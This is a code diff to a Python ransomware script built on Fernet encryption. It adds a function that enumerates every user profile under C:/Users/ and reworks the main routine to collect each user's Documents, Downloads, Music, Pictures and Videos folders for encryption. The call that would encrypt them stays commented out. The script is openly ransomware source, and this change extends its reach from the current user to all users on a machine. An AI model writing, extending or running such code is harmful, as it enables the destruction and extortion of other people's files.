@@ -3,6 +3,7 @@
 #===========================#
 
 from cryptography.fernet import Fernet, InvalidToken
+import glob
 import os
 
 class bcolors:
@@ -123,34 +124,61 @@ def deransomware(dirsToEncrypt):
 
 #===========================#
 
+def enumerate_users():
+
+    users = []
+
+    # Path where user profiles are stored
+    user_profiles_path = 'C:/Users/'
+
+    # Get a list of all user directories in the user profiles path
+    user_directories = glob.glob(os.path.join(user_profiles_path, '*'))
+
+    for user_dir in user_directories:
+        documents_folder = os.path.join(user_dir, 'Documents')
+        if os.path.exists(documents_folder):
+            user = str(os.path.basename(user_dir))
+            if user != "All Users" and user != "Default" and user != "Default User" and user != "Public":
+                print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User found: [{bcolors.OKCYAN}"+user+f"{bcolors.ENDC}]")
+                users.append(user_dir)
+    
+    return users
+
+#===========================#
+
 if __name__ == '__main__':
 
     # Generate an encryption key.
     print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating encryption key...")
     generate_key()
     
-    # Generate file paths for this user.
-    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
-    documentsFolder = os.path.join(os.path.expanduser('~'), 'Documents')
-    downloadsFolder = os.path.join(os.path.expanduser('~'), 'Downloads')
-    musicFolder = os.path.join(os.path.expanduser('~'), 'Music')
-    picturesFolder = os.path.join(os.path.expanduser('~'), 'Pictures')
-    videosFolder = os.path.join(os.path.expanduser('~'), 'Videos')
+    # Enumerate all users on the machine.
+    users = enumerate_users()
     
-    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
-    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
-    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+downloadsFolder+f"{bcolors.ENDC}]")
-    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+musicFolder+f"{bcolors.ENDC}]")
-    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+picturesFolder+f"{bcolors.ENDC}]")
-    print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+videosFolder+f"{bcolors.ENDC}]")
+    for user_dir in users:
     
-    commonDirectories = [
-        documentsFolder,
-        downloadsFolder,
-        musicFolder,
-        picturesFolder,
-        videosFolder,
-    ]
-    
-    # Encrypt everything!
-    # ransomware(commonDirectories)
+        # Generate file paths for this user.
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
+        documentsFolder = os.path.join(user_dir, 'Documents')
+        downloadsFolder = os.path.join(user_dir, 'Downloads')
+        musicFolder = os.path.join(user_dir, 'Music')
+        picturesFolder = os.path.join(user_dir, 'Pictures')
+        videosFolder = os.path.join(user_dir, 'Videos')
+        
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+downloadsFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+musicFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+picturesFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+videosFolder+f"{bcolors.ENDC}]")
+        
+        commonDirectories = [
+            documentsFolder,
+            downloadsFolder,
+            musicFolder,
+            picturesFolder,
+            videosFolder,
+        ]
+        
+        # Encrypt everything!
+        # ransomware(commonDirectories)
